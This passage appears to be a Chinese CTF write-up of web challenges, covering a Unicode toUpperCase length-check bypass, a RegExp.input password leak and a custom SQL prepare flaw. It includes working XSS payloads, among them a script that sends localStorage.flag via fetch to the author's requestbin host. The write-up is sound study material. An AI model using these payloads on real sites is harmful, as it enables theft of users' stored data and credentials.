<p>第一反应是尝试构造一个ID，使用已知的token通过检验，但在访问时因为特殊处理访问到0。但代码中先将id进行了parseInt操作再传入，且无后续操作。不存在先操作再parse之类的经典垃圾代码。虽然在签token的时候使用了toString，但对于parseInt必定返回一个int或NaN，这两个值在toString的时候也不会存在奇怪的表现。似乎无法攻击<br>第二个想法是能不能在签token的时候直接给他整爆掉就不用考虑什么secret了，但是传进去的id是个数字再toString，怎么整的爆呢。<br>然后考虑在createNote的时候直接生成一个id，因为<code>const id = this.notes.length</code>，如果可以直接使用类似原型链污染的形式控制notes的length属性，就可以直接签发一个危险的id，但这里查看用户输入，根本没有类似类型的交互流程，虽然有一瞬间想起来之前RWCTF的requests.files的污染，但这里完全没有这种类型的威胁。且该题目为共用环境，若存在这种漏洞的话一个人打通剩下人就都通了，不太可能。</p>
<p>然后又想了半天能不能构造，发现先parseInt再传入简直无敌防御，不会了</p>
<p>说起来这个<code>crypto.randomUUID</code>在我本地是个函数来着，但是这里却直接是以属性的形式访问的，但直接以属性值访问的时候就undefined了。一开始还以为这里就是这个题的垃圾代码所在地。但是直接把secret那里改成undefined自己签一个token上去，并打不通。可能是远端有着奇异的配置？</p>
<p>等wping</p>
<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>。。。还真就是这个东西，但这里的randomUUID并不是undefined，而是函数源码，这和node的版本有关，题目给出了dockerfile，他的node版本会返回函数源码，可能是我的node比较老，返回的是undefined。所以还是一个定值，自己签一个token就行了。。。</p>
<p>啊啊啊啊啊啊啊啊啊啊啊，我好垃圾</p>
<h2 id="blazingfast"><a href="#blazingfast" class="headerlink" title="blazingfast"></a>blazingfast</h2><p>这个又是一个没见过的全新技术，大概就是能把C代码编译成奇怪的插件给前端用。</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> blazingfast <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">mock</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    blazingfast<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'Too long!'</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> str<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'Nice try.'</span><span class="token punctuation">;</span>
        blazingfast<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>blazingfast<span class="token punctuation">.</span><span class="token function">mock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">'No XSS for you!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> mocking <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> buf <span class="token operator">=</span> blazingfast<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span>buf <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            mocking <span class="token operator">+</span><span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            buf <span class="token operator">=</span> blazingfast<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> mocking<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">demo</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token function">mock</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

WebAssembly<span class="token punctuation">.</span><span class="token function">instantiateStreaming</span><span class="token punctuation">(</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/blazingfast.wasm'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span> instance <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    
    blazingfast <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo-submit'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
        <span class="token function">demo</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> query<span class="token punctuation">;</span>
        <span class="token function">demo</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<pre class=" language-C"><code class="language-C">int length, ptr = 0;
char buf[1000];

void init(int size) {
    length = size;
    ptr = 0;
}

char read() {
    return buf[ptr++];
}

void write(char c) {
    buf[ptr++] = c;
}

int mock() {
    for (int i = 0; i < length; i ++) {
        if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
            buf[i] += 32;
        }

        if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
            return 1;
        }
    }

    ptr = 0;

    return 0;
}
</code></pre>
<p>这里究极过滤了两个尖括号，但是我的输入点又在标签之外，直接不会</p>
<p>这里先把所有内容toUpperCase，然后还检查了charCodeAt都不大于128，最后才进这个C逻辑。感觉过了上面这两步之后又是一个无敌防御了。。。呜呜<br>这个题的解数也还可观，不知道怎么打的</p>
<h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><p>这里还是有一个垃圾代码，当时可能是被web1打蒙了，已经失去意识了，没看出来</p>
<p>在js处的mock函数中，先使用了str.length来记录字符串的长度，再对string进行了toUpperCase，而对于某些玄幻的Unicode，toUpperCase会导致一个字符变成两个字符，从而延长了整个字符串的长度。（用toLocaleUpperCase也许会更加正确的处理Unicode？）而在写入时使用的是<code>for (let c of str.toUpperCase()</code>，写入的数量与init处设定的length无关，且由于toUpperCase的扩展写入了更长的字符串。而在C的mock处只使用init时设定的length对xss内容进行检测。也就意味着写入的字符串由于toUpperCase扩展出的额外长度不会被检测，而在读取时也并未使用设定的length进行读取，导致了完美的逃逸<br>写了个破烂来找一些toUpperCase扩展的字符</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">65536</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">let</span> c <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> c<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>用这个类似贝塔<code>ß</code>的符号可以一个字符toUpperCase成<code>SS</code>，不过这里还是有一个小小的问题，即使过了xss的检测，传入的字符还是全都toUpperCase了，js的函数是区分大小写的，这样子就打不动了。但是标签和属性名称似乎不区分大小写，那么写一个全大写的img标签，再把onerror里面的字符串使用实体编码绕过大小写限制即可（这里是直接看wp得到的答案。。。）</p>
<p>然后写一个简单payload从localStorage中取出flag发出即可，这里有几个简单的小坑，实体编码的形式是<code>&amp;#xx;</code>&amp;#都需要url编码。然后题目是https的环境，直接nc端口发http会因为mix content被禁止发出。所以我把我的远古requestbin又翻出来用了。不过应该也能通过直接改window.location之类的方法外带出来吧</p>
<p>rubbish code</p>
<pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">"fetch(\"https://requestbin.z3ratu1.cn/?\"+localStorage.flag)"</span>
b <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"&amp;#"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> a<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token string">"&lt;img src=\"1\" onerror=\"{}\">"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token string">"ß"</span><span class="token operator">*</span>len<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span>c<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"%26"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"%23"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
</code></pre>
<p>这里还有一个大师魔改了jsfuck来编写全大写payload（jsfuck的长度太长会超过一千字符的限制）<br><a href="https://smitop.com/p/dctf22-blazingfast/">dctf22-blazingfast</a></p>
<p>复现成功呜呜<br><code>dice&#123;1_dont_know_how_to_write_wasm_pwn_s0rry&#125;</code></p>
<h2 id="no-cookies"><a href="#no-cookies" class="headerlink" title="no-cookies"></a>no-cookies</h2><p>这个有点麻，不用cookie的身份认证就是无论进行什么操作都要重新输一遍密码<br>并且我感觉还是很究极<br>XSS在后端过滤了尖括号，前端使用这个函数渲染页面</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> validate <span class="token operator">=</span> <span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token operator">/</span><span class="token operator">^</span><span class="token punctuation">[</span><span class="token operator">^</span>$<span class="token string">']+$/.test(text ?? '</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> promptValid <span class="token operator">=</span> <span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">validate</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">?</span> result <span class="token punctuation">:</span> <span class="token function">promptValid</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Username:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Password:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> <span class="token punctuation">{</span> note<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> views <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>
          <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        body<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          username<span class="token punctuation">,</span>
          password<span class="token punctuation">,</span>
          id<span class="token punctuation">:</span> params<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Invalid username, password, or note id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">let</span> text <span class="token operator">=</span> note<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">===</span> <span class="token string">'markdown'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[([^\]]+)\]\(([^\)]+)\)/g</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p2<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/a>`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/#\s*([^\n]+)/g</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>match<span class="token punctuation">,</span> p1<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/h1>`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\*\*([^\n]+)\*\*/g</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>match<span class="token punctuation">,</span> p1<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/strong>`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\*([^\n]+)\*/g</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>match<span class="token punctuation">,</span> p1<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;em></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/em>`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>主要看最后那点的渲染，在mode是markdown的时候有几个选项<br>在过滤了尖括号的情况下感觉只有href能用，但href这里因为正则匹配时链接内容处匹配到右括号就结束了，又加了一层没有右括号的限制</p>
<p>简单搜索和调试之后找到了不用括号的href xss方法</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token property">"note"</span><span class="token operator">:</span><span class="token string">"[aa](javascript:document.head.innerHTML+= `\u005cx3cimg src='1' onerror='alert\u005cx281\u005cx29'\u005cx3e`;)"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"markdown"</span><span class="token punctuation">}</span>
</code></pre>
<p>这里json传数据，单个<code>\</code>直接传过去会报错，所以整了个<code>\u005c</code>，再用反引号当引号把数据括起来。不然会导致奇怪的引号范围解析（好像这里用HTML escape的那个&amp;#xx;也行</p>
<p>这样子就能在点击a标签后进行xss了。但问题在于bot好像不会去点这个标签。。。那咋整呢。好像没有什么a标签自动触发的xss啊</p>
<p>翻到了一个a标签自动触发的payload<br><code>&lt;a href=&quot;1&quot; onfocus=&quot;alert(1)&quot; autofocus tabindex=&quot;1&quot;&gt;&lt;/a&gt;</code></p>
<p>再看一眼bot.js，flag是admin账号的密码。但这里因为没有cookie，所以是进行任何操作的时候都输一遍账户密码，而密码也只是在页面运行的时候塞进了那个匿名函数的局部变量中。而我们的payload插入成功后这个匿名函数都执行结束了，可爱的flag也随着匿名函数一起消亡了。我觉得唯一的可能就是去翻内存找？但是我感觉再次调用函数就会把原来的栈覆盖。怎么办呢</p>
<h3 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h3><p>还没蹲到官方wp，只看到discord里面的讨论，让我一个菜狗去看英语究极简化口语简直是折磨。。。<br>看到的一个链接是这个MDN的文档<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input</a><br>再看了其他人的wp， 我总算是理解了，在前端代码中出现了令人困惑的内容</p>
<pre class=" language-javascript"><code class="language-javascript">    <span class="token keyword">const</span> validate <span class="token operator">=</span> <span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token operator">/</span><span class="token operator">^</span><span class="token punctuation">[</span><span class="token operator">^</span>$<span class="token string">']+$/.test(text ?? '</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> promptValid <span class="token operator">=</span> <span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">validate</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">?</span> result <span class="token punctuation">:</span> <span class="token function">promptValid</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Username:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Password:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这里对用户名和密码启用了非常奇怪的验证，而根据上述文档的描述，RegExp.input变量保留了最后一个匹配正则表达式的内容，在登录之后直接控制台输入RegExp.input就能直接获取到密码（因为先匹配用户名再匹配密码）。似乎配合a标签的xss就能打了，但在a标签的渲染这里还是有一个问题</p>
<pre class=" language-javascript"><code class="language-javascript">      <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">===</span> <span class="token string">'markdown'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[([^\]]+)\]\(([^\)]+)\)/g</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p2<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>p1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/a>`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>只要选用了markdown这个选项，就会创建一个新的正则表达式去匹配，从而覆盖掉我们的input中的password项</p>
<p>此时需要从后端代码中寻找突破口。我一开始就发现了后端代码里的一个怪东西</p>
<pre class=" language-javascript"><code class="language-javascript">  prepare<span class="token punctuation">:</span> <span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">)</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> clean <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token string">'$]/g, '</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
        query <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`'</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>clean<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token keyword">return</span> query<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>s
  <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> prepared <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> database<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>prepared<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre>
<p>你这prepare这么写的？虽然说去掉单引号确实有点无敌防御，但也不太完全吧。。。以及这种库肯定自己实现了prepare，然后你先过一遍自己的prepare，再过一遍第三方库的prepare，必有问题（但是实际做题的时候人已经麻了，失去思考能力）</p>
<pre class=" language-javascript"><code class="language-javascript">  db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    id<span class="token punctuation">,</span>
    username<span class="token punctuation">,</span>
